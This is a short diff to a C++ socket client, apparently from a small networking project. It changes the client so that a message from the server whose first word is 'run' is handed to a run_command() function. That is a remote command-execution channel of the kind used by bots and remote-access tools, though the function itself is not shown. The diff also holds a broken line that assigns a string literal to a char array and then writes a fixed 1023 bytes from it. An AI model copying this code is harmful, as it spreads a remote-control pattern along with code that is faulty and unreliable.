@@ -69,7 +69,7 @@ int run_client() {
 
 	struct sockaddr_in addr;
 
-	char buffer[2048];
+	char buffer[1024];
 
 	fd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -100,14 +100,25 @@ int run_client() {
 
 		cout << "Successfully connected...." << endl;
 
-		bzero(buffer, 2048);
-		res = read(fd, buffer, 2047);
+		bzero(buffer, 1024);
+		res = read(fd, buffer, 1023);
 		if(res < 0) {
 			cout << "Error reading from socket" << endl;
 		}
-		cout << buffer << endl;
-		bzero(buffer, 2048);
-		res = write(fd, buffer, 2047);
+
+		string tokens[20];
+
+		tokenize(buffer, tokens);
+
+		if(tokens[0].compare("run") == 0) {
+			run_command(tokens);
+		}
+		else {
+			cout << buffer << endl;
+		}
+		bzero(buffer, 1024);
+		buffer = "Task completed...";
+		res = write(fd, buffer, 1023);
 		if(res < 0) {
 			cout << "Error writing to socket" << endl;
 		}
